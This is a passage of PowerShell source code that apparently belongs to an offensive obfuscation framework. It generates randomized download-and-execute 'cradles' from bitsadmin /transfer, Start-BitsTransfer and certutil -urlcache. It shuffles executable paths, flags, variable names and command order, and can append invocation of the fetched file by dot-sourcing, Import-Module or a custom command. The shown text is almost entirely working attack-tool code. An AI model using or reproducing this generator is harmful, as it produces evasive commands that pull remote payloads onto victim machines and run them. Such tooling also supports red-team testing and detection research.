                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2$PathQuoted"
                        $CommandArray += "$StartBitsTransfer$SourceFlag$GetVar1 $DestinationFlag$GetVar2"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_01] + $CommandArray[2,3]) -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        22 {
            ###############################
            ## BITSAdmin - bitsadmin.exe ##
            ###############################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Default syntax (no variables used to break up command syntax).
                    
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','DownloadFlag')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$PathQuoted)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$PathQuoted)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "`$NULL=bitsadmin /transfer $DownloadFlag $Url $Path"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = $CommandArray -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url'   # Url
                    $RandomVarName2 = 'dpath' # Path

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','DownloadFlag')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar2)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar2)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2$PathQuoted"
                        $CommandArray += "`$NULL=bitsadmin /transfer $DownloadFlag $GetVar1 $GetVar2"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_01] + $CommandArray[2,3]) -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                    
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','DownloadFlag')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar2)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar2)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2$PathQuoted"
                        $CommandArray += "`$NULL=bitsadmin /transfer $DownloadFlag $GetVar1 $GetVar2"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_01] + $CommandArray[2,3]) -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        23 {
            #######################################
            ## CERTUTIL - certutil.exe -urlcache ##
            #######################################

            # Variables required for Certutil syntax.
            $Certutil = Get-Random -Input @('certutil.exe','certutil','C:\Windows\System32\certutil.exe','C:\Windows\System32\certutil')
            $UrlCache = Get-Random -Input @('-urlcache','/urlcache')
            $Force    = Get-Random -Input @('-f','/f')
            $Flags    = (Get-Random -Input @($UrlCache,$Force) -Count 2) -Join ' '

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Default syntax (no variables used to break up command syntax).
                    
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$PathQuoted)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$PathQuoted)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "`$NULL=$Certutil $Flags $Url $Path"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = $CommandArray -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url'   # Url
                    $RandomVarName2 = 'dpath' # Path

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar2)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar2)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2$PathQuoted"
                        $CommandArray += "`$NULL=$Certutil $Flags $GetVar1 $GetVar2"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_01] + $CommandArray[2,3,4]) -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                    
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
